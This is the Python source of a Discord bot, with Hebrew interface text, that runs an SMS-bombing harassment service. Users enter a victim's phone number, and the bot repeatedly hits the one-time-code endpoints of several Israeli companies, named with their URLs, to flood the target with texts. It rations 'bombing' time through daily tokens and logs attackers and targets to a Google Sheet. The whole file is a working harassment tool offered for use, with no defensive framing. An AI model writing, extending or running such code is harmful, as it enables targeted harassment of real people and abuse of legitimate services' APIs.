import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio
from datetime import datetime, timedelta

# הגדרות סביבה
TOKEN = os.getenv('DISCORD_TOKEN')
GSHEET_URL = os.getenv('GSHEET_URL')

# חסימת מספר ספציפי
BLOCKED_NUMBER = "0535524017"

# ניהול נתונים בזיכרון (טוקנים מייצגים דקות)
user_tokens = {}  # {user_id: total_minutes}
user_cooldowns = {}  # {user_id: next_claim_time}
active_attacks = {}

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()

bot = CyberBot()

# --- פונקציות עזר ---
def get_balance(user_id):
    return user_tokens.get(user_id, 0)

def can_claim(user_id):
    if user_id not in user_cooldowns: return True
    return datetime.now() >= user_cooldowns[user_id]

def send_to_sheet(user_name, user_id, phone, rounds, success, failed):
    if not GSHEET_URL: return
    payload = {
        "user_name": user_name, "user_id": str(user_id), "target_phone": phone,
        "rounds": rounds, "success_count": success, "failed_count": failed,
        "timestamp": str(datetime.now())
    }
    try: requests.post(GSHEET_URL, json=payload, timeout=5)
    except: print("❌ GSheet Error")

# --- מנוע ה-API ---
def api_request(url, payload=None, method="POST", is_json=True):
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        if method == "GET": r = requests.get(url, headers=headers, timeout=4)
        else:
            if is_json: r = requests.post(url, json=payload, headers=headers, timeout=4)
            else: r = requests.post(url, data=payload, headers=headers, timeout=4)
        return r.status_code in [200, 201]
    except: return False

async def fire_round(phone):
    tasks = [
        asyncio.to_thread(api_request, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
        asyncio.to_thread(api_request, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", {"phoneNumber": phone}),
        asyncio.to_thread(api_request, "https://api.dominos.co.il/sendOtp", {"otpMethod": "text", "customerId": phone, "language": "he", "requestNum": 8}),
        asyncio.to_thread(api_request, "https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
        asyncio.to_thread(api_request, f"https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/{phone}", method="GET"),
        asyncio.to_thread(api_request, "https://api.hopon.co.il/v0.15/1/isr/users", {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": phone, "phoneCall": False})
    ]
    results = await asyncio.gather(*tasks)
    return sum(results), len(results) - sum(results)

# --- לוגיקת הרצה ---
async def run_attack_logic(interaction, phone, rounds):
    uid = interaction.user.id
    if phone == BLOCKED_NUMBER:
        return await interaction.followup.send("🚫 המספר הזה חסום במערכת!", ephemeral=True)

    # חישוב זמן: כל סיבוב לוקח כ-2 שניות. 30 סיבובים = דקה אחת (טוקן 1)
    cost_per_round = 1/30 
    total_cost = int(rounds) * cost_per_round
    
    if get_balance(uid) < total_cost:
        return await interaction.followup.send(f"❌ אין לך מספיק זמן בטוקנים! נדרש: {round(total_cost, 2)} דקות.", ephemeral=True)

    active_attacks[uid] = True
    total_s, total_f = 0, 0
    
    for _ in range(int(rounds)):
        if not active_attacks.get(uid) or get_balance(uid) < cost_per_round: break
        
        s, f = await fire_round(phone)
        total_s += s
        total_f += f
        user_tokens[uid] -= cost_per_round
        await asyncio.sleep(2)
    
    send_to_sheet(interaction.user.name, uid, phone, rounds, total_s, total_f)
    active_attacks.pop(uid, None)
    await interaction.followup.send(f"✅ הסתיים! הצלחות: {total_s}. יתרת זמן: {round(get_balance(uid), 2)} דקות.", ephemeral=True)

# --- ממשק דיסקורד ---
class AttackControl(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 התחל הפצצה", style=discord.ButtonStyle.danger)
    async def start_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if get_balance(interaction.user.id) <= 0:
            return await interaction.response.send_message("❌ נגמר לך הזמן! קח טוקנים יומיים.", ephemeral=True)
            
        class BombModal(discord.ui.Modal, title="CyberIL Launcher"):
            phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10)
            rounds = discord.ui.TextInput(label="כמות סיבובים (30 סיבובים = 1 דקה)", default="30")
            async def on_submit(self, modal_inter: discord.Interaction):
                await modal_inter.response.defer(ephemeral=True)
                asyncio.create_task(run_attack_logic(modal_inter, self.phone.value, self.rounds.value))
        await interaction.response.send_modal(BombModal())

    @discord.ui.button(label="🎫 קח טוקן יומי (5 דקות)", style=discord.ButtonStyle.success)
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        if can_claim(uid):
            user_tokens[uid] = get_balance(uid) + 5
            user_cooldowns[uid] = datetime.now() + timedelta(hours=24)
            await interaction.response.send_message(f"✅ קיבלת 5 טוקנים (5 דקות)! יתרה: {user_tokens[uid]} דקות.", ephemeral=True)
        else:
            diff = user_cooldowns[uid] - datetime.now()
            hours, remainder = divmod(int(diff.total_seconds()), 3600)
            minutes, _ = divmod(remainder, 60)
            await interaction.response.send_message(f"⏳ המתן {hours} שעות ו-{minutes} דקות לקבלת טוקנים חדשים.", ephemeral=True)

    @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.secondary)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_attacks[interaction.user.id] = False
        await interaction.response.send_message("🚨 פעולה נעצרה.", ephemeral=True)

# --- פקודות Slash ---

@bot.tree.command(name="spamer-setup", description="הגדרת לוח בקרה")
async def spamer_setup(interaction: discord.Interaction):
    balance = round(get_balance(interaction.user.id), 2)
    embed = discord.Embed(title="⚡ CyberIL Time Control", color=0x00FFFF)
    embed.add_field(name="יתרת זמן", value=f"`{balance}` דקות", inline=True)
    embed.add_field(name="מידע", value="• 1 טוקן = 1 דקה של ספאם\n• טוקן יומי מעניק 5 דקות\n• כל סיבוב מוריד מהזמן היחסי", inline=False)
    await interaction.response.send_message(embed=embed, view=AttackControl())

@bot.tree.command(name="spamer-givetokens", description="הענקת דקות למשתמש (מנהל)")
async def give_tokens(interaction: discord.Interaction, user: discord.Member, amount: int):
    user_tokens[user.id] = get_balance(user.id) + amount
    await interaction.response.send_message(f"🎁 הוענקו {amount} דקות ל-{user.mention}.", ephemeral=True)

@bot.tree.command(name="spamer-enable-number", description="בדיקת מספר")
async def spamer_enable(interaction: discord.Interaction, number: str):
    is_blocked = number == BLOCKED_NUMBER
    msg = f"❌ המספר `{number}` חסום!" if is_blocked else f"✅ המספר `{number}` פתוח."
    await interaction.response.send_message(msg, ephemeral=True)

bot.run(TOKEN)
